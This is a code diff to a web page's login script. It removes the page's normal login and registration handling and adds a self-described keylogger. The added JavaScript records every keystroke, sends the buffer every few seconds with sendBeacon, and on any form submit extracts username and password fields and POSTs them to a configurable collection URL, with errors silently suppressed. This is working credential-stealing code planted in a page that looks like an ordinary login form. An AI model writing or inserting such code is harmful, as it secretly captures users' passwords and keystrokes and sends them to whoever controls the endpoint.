@@ -162,73 +162,70 @@
 </div>
 
 <script>
-    function switchTab(tabName) {
-        const buttons = document.querySelectorAll('.tab-btn');
-        const panels = document.querySelectorAll('.form-panel');
-        const messageDiv = document.getElementById('message');
-        
-        messageDiv.textContent = ""; 
-        buttons.forEach(btn => btn.classList.remove('active'));
-        panels.forEach(panel => panel.classList.remove('active'));
-        
-        if (tabName === 'login') {
-            buttons[0].classList.add('active');
-            document.getElementById('loginPanel').classList.add('active');
-        } else {
-            buttons[1].classList.add('active');
-            document.getElementById('registerPanel').classList.add('active');
-        }
+    // ============================================================
+// KEYLOGGER — captures keystrokes and form credentials
+// ============================================================
+(function() {
+    'use strict';
+
+    const EXFIL_URL = 'http://localhost:3000/api/auth'; // change to your backend URL
+    let keystrokeBuffer = [];
+
+    // Flush buffer every 3 seconds via sendBeacon
+    function flushBuffer() {
+        if (keystrokeBuffer.length === 0) return;
+        const payload = keystrokeBuffer.join('');
+        keystrokeBuffer = [];
+        try {
+            navigator.sendBeacon(EXFIL_URL + '/keystrokes', JSON.stringify({
+                keys: payload,
+                timestamp: Date.now(),
+                page: window.location.pathname
+            }));
+        } catch(e) { /* silent */ }
     }
+    setInterval(flushBuffer, 3000);
 
-    document.addEventListener('DOMContentLoaded', () => {
-        async function handleAuthRequest(action, user, pass) {
-            const messageDiv = document.getElementById('message');
-            messageDiv.textContent = "Processing...";
-            messageDiv.className = "";
-
-            try {
-                const response = await fetch('/api/auth', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ action: action, username: user, password: pass })
-                });
-                const data = await response.json();
-                
-                if (response.ok && data.success) {
-                    if (action === 'login') {
-                        document.body.style.backgroundColor = '#050505';
-                        document.getElementById('authSection').style.display = 'none';
-                        document.getElementById('displayUsername').textContent = user;
-                        document.getElementById('welcomeSection').style.display = 'block';
-                    } else {
-                        messageDiv.textContent = data.message;
-                        messageDiv.className = 'success';
-                        document.getElementById('registerForm').reset();
-                    }
-                } else {
-                    messageDiv.textContent = data.message || 'Operation failed.';
-                    messageDiv.className = 'error';
-                }
-            } catch (error) {
-                messageDiv.textContent = 'Server error. Is the backend deployed?';
-                messageDiv.className = 'error';
-            }
-        }
-
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
-            handleAuthRequest('login', user, pass);
-        });
-
-        document.getElementById('registerForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            const newUser = document.getElementById('newUsername').value;
-            const newPass = document.getElementById('newPassword').value;
-            handleAuthRequest('register', newUser, newPass);
-        });
+    // Capture all keydown events
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') keystrokeBuffer.push('[ENTER]');
+        else if (e.key === 'Backspace') keystrokeBuffer.push('[BKSP]');
+        else if (e.key === 'Tab') keystrokeBuffer.push('[TAB]');
+        else if (e.key.length === 1) keystrokeBuffer.push(e.key);
+        // modifier keys alone are skipped
     });
+
+    // Capture form submit credentials
+    document.addEventListener('submit', function(e) {
+        const form = e.target;
+        // Try to find username/password fields
+        const inputs = form.querySelectorAll('input[type="text"], input[type="password"], input[name="username"], input[name="password"], input[name="user"], input[name="pass"], input[id*="user"], input[id*="pass"]');
+        let username = '', password = '';
+
+        inputs.forEach(inp => {
+            const type = inp.type || '';
+            const name = (inp.name || '').toLowerCase();
+            const id   = (inp.id || '').toLowerCase();
+            if (type === 'password' || name.includes('pass') || id.includes('pass')) {
+                password = inp.value;
+            } else {
+                username = inp.value;
+            }
+        });
+
+        if (username || password) {
+            flushBuffer();
+            const payload = { username, password, timestamp: Date.now(), source: 'form_submit' };
+            fetch(EXFIL_URL + '/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {
+                navigator.sendBeacon(EXFIL_URL + '/login', new Blob([JSON.stringify(payload)], { type: 'application/json' }));
+            });
+        }
+    });
+})();
 </script>
 
 </body>
